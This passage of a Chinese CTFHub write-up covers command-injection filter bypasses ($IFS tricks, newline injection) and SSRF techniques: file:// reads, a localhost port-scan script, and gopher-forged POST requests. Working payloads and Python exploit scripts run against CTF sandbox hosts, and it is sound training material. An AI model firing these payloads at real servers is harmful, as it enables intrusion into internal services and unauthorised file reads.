class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以下是绕过空格的部分方法。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt <br><span class="hljs-built_in">cat</span>&lt;flag.txt <br><span class="hljs-built_in">cat</span>&lt;&gt;flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210907172403041.png" alt="绕过空格的一些方法" /></p><p>在bash情况下都能实现，但是zsh下只有<code>&lt;</code>和<code>&lt;&gt;</code>成功了。</p><p><img src="https://upyun.wuuconix.link/image-20210907172457282.png" alt="zsh下的情况" /></p><p>估计在bash情况下<code>$&#123;IFS&#125;</code>和<code>$IFS$9</code>的值是一个空格。但是在zsh的情况是换行的原因。</p><h3 id="过滤目录分隔符"><a class="markdownIt-Anchor" href="#过滤目录分隔符"></a> 过滤目录分隔符</h3><p>部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>flag在一个目录下边。但是过滤了<code>/</code>，那怎么办呢？先cd进去不就行了2333</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1; <span class="hljs-built_in">cd</span> flag_is_here &amp;&amp; <span class="hljs-built_in">cat</span> flag_14385852030406.php<br></code></pre></td></tr></table></figure><h3 id="过滤运算符"><a class="markdownIt-Anchor" href="#过滤运算符"></a> 过滤运算符</h3><p>部分源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||\&amp;)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>它过滤了<code>&amp;</code>和<code>|</code>，但是我命令连接符号一直用的<code>;</code>呀2333。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">;cat flag_15157229854259.php</span><br></code></pre></td></tr></table></figure><h3 id="综合过滤练习"><a class="markdownIt-Anchor" href="#综合过滤练习"></a> 综合过滤练习</h3><p>这个综合练习就非常狠了啊，过滤了一堆。</p><p>部分源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是大部分题目都知道了如何绕过，但是这个所有命令连接符<code>&amp; | ;</code>全部被过滤的情况我还是第一次见。</p><p>查询资料过后发现可以用换行符来绕过。（但是直接在Linux上貌似不能这样用，应该是php奇怪的特性</p><p>官方的wp说的是</p><p><img src="https://upyun.wuuconix.link/image-20210907185237961.png" alt="官方wp" /></p><p>但其实这几个url编码其实就是<code>\n</code> <code>\r</code> 和<code>\n\r</code>。</p><p>以下为payload脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-built_in">id</span> = parse.quote(<span class="hljs-string">&quot;1\ncd$&#123;IFS&#125;fla*\ntac$&#123;IFS&#125;f*&quot;</span>)<br>burp0_url = <span class="hljs-string">f&quot;http://challenge-b57b1d23d9161cc7.sandbox.ctfhub.com:10800/?ip=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://challenge-b57b1d23d9161cc7.sandbox.ctfhub.com:10800/&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>respoonse = requests.get(burp0_url, headers=burp0_headers).text<br>soup = BeautifulSoup(respoonse, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.pre)<br></code></pre></td></tr></table></figure><p>哦对了，它还过滤了<code>flag</code>。可以用<code>cd fla*</code>来进入目录和用<code>tac f*</code>来读flag。</p><p>这里还用到了<code>BeautifulSoup</code>这个库来方便得观察response。</p><p>响应中有一堆无关信息，有用得信息在<code>&lt;pre&gt;</code>标签中。</p><p><img src="https://upyun.wuuconix.link/image-20210907185735812.png" alt="pre标签" /></p><p>我们可以用<code>soup.pre</code>来将pre标签从响应中拿出来观察。十分方便。</p><p><img src="https://upyun.wuuconix.link/image-20210907185829226.png" alt="ctf" /></p><h2 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h2><h3 id="内网访问"><a class="markdownIt-Anchor" href="#内网访问"></a> 内网访问</h3><p>提示内网的flag.php。url中有url参数。填入即可。</p><p><img src="https://upyun.wuuconix.link/image-20210908100912005.png" alt="题干" /></p><p><img src="https://upyun.wuuconix.link/image-20210908100959062.png" alt="ctf" /></p><p>看了一下别人的wp。发现更好的填法应该是<code>?url=http://127.0.0.1/flag.php</code>。</p><h3 id="伪协议读取文件"><a class="markdownIt-Anchor" href="#伪协议读取文件"></a> 伪协议读取文件</h3><p>直接上http协议的话没有看到flag。估计flag藏在php的注释中，无法直接看到。</p><p><img src="https://upyun.wuuconix.link/image-20210908102120976.png" alt="直接http" /></p><p>可以用file协议来读文件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-b5191e365b757889.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210908101904465.png" alt="ctf" /></p><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p>这道题提示flag在8000-9000端口中。</p><p>一开始用Burp直接爆破 端口。但是貌似由于请求速度过快，导致一些页面返回503，从而无法得到正确答案，但是我也不知道这个怎么设置2333。我的这个Burp版本和网上的也不太一样 。</p><p><img src="https://upyun.wuuconix.link/image-20210908104845140.png" alt="image-20210908104845140" /></p><p>然后我就用python写脚本试端口。一开始用的代码时burp上直接转化出来的，它有一个特点就是get没有<code>params</code>值，最后也没有正确得到结果。</p><p><img src="https://upyun.wuuconix.link/image-20210908105033708.png" alt="Copy as requests" /></p><p>最后还是自己改一下吧2333，加上了<code>params</code>参数。不能太迷信工具。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8000</span>, <span class="hljs-number">9000</span>):<br>    burp0_url = <span class="hljs-string">f&quot;http://challenge-85119fa5ff180354.sandbox.ctfhub.com:10800/&quot;</span><br>    param = &#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;http://127.0.0.1:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>&#125;<br>    response = requests.get(burp0_url, params=param).text<br>    <span class="hljs-keyword">if</span>(response == <span class="hljs-string">&quot;&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;port: <span class="hljs-subst">&#123;port&#125;</span> failed!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;port: <span class="hljs-subst">&#123;port&#125;</span> success!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>最后在8162端口找到了flag。</p><p><img src="https://upyun.wuuconix.link/image-20210908105200560.png" alt="port 8162" /></p><h3 id="post请求"><a class="markdownIt-Anchor" href="#post请求"></a> POST请求</h3><p>dirsearch扫描后发现<code>flag.php</code>和<code>index.php</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210909220059148.png" alt="dir" /></p><p>它还是提供了url参数来供我们访问内网文件。我们可以分别利用http协议和file协议来查看文件。</p><p><img src="https://upyun.wuuconix.link/image-20210909220244039.png" alt="flag.php 神秘key" /></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-97df9c16e9c64c56.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-97df9c16e9c64c56.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=<span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>我们仔细观察<code>flag.php</code>文件的内容即可发现，只要伪造来自内网的请求，然后post一个提供的key<code>260a97ac2ef360dec36238c7d6c49c25</code>即可得到flag。</p><p>但是这种伪造可不好实现。php中的<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>，它会返回当前浏览页面的用户的ip地址。</p><p>这并不是简单的修改HTTP报文能够实现的。查看过wp之后，我了解到了gopher协议。</p><blockquote><p>gopher协议（攻击内网服务的万金油）：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</p></blockquote><p>相当于我们得利用这个gopher协议来让题目的机器给<code>flag.php</code>发送一个post请求包。这里就把ctfhub这个专题的名字<code>SSRF(Server-Side Request Forgery) 服务器端请求伪造</code>演示的淋漓尽致了。我们将利用gopher协议模拟服务器向flag.php的请求。</p><p>查询过资料后gopher协议中的post请求需要包含几个必要的字段<code>HOST</code>，<code>Content-Length</code>,<code>Content-Type</code>。</p><p>同时需要经过两层url加密，为什么呢？因为一开始gopher协议给url参数传的时候浏览器会进行第一次url解码。传给php了，php那里的curl_exec相当于还是一次类浏览器操作，会进行第二次url解码。</p><p>此外还要注意第一次url编码后需要将<code>%0A</code>全部换为<code>%0D0A</code>。其实就是把换行符<code>\n</code>换为<code>\r\n</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210909223406812.png" alt="换行符的url编码值" /></p><p>Linux里的换行比较简约，一个<code>\n</code>即可。而Window的换行比较阔绰，多一个字符<code>\r\n</code>。</p><p>这里需要换，估计是内网的机器是windows的？挺奇怪的。一般出题都是docker部署，应该都是Linux的呀2333。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>payload = \<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">POST /flag.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">key=260a97ac2ef360dec36238c7d6c49c25</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = quote(payload)<br>payload = payload.replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>payload = <span class="hljs-string">f&quot;gopher://127.0.0.1:80/_<span class="hljs-subst">&#123;quote(payload)&#125;</span>&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210909222419140.png" alt="result" /></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>APOST%<span class="hljs-number">2520</span>/flag.php%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>application/x-www-form-urlencoded%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Length%<span class="hljs-number">253</span>A%<span class="hljs-number">252036</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Akey%<span class="hljs-number">253</span>D260a97ac2ef360dec36238c7d6c49c25%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure><p>我们把这一段payload加到url那里就可以得到flag啦！</p><p><img src="https://upyun.wuuconix.link/image-20210909222517014.png" alt="flag" /></p><p>gopher那里一开始Host我写的是<code>127.0.0.1</code>貌似不行，必须得指定端口。</p><h3 id="上传文件"><a class="markdownIt-Anchor" href="#上传文件"></a> 上传文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-608a043246aa77d5.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Upload Webshell<br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-608a043246aa77d5.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><p>查看过它的flag.php之后我们只要模拟服务器向flag.php发送一个文件即可获得flag。同样的，我们利用攻击内网服务万金油gopher协议来实现。</p><p>原题的上传压根就没有上传按钮，都没法抓包2333。于是我加了一个<code>submit</code>类型的input然后先把服务放在自己的机器上，进行抓包。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span 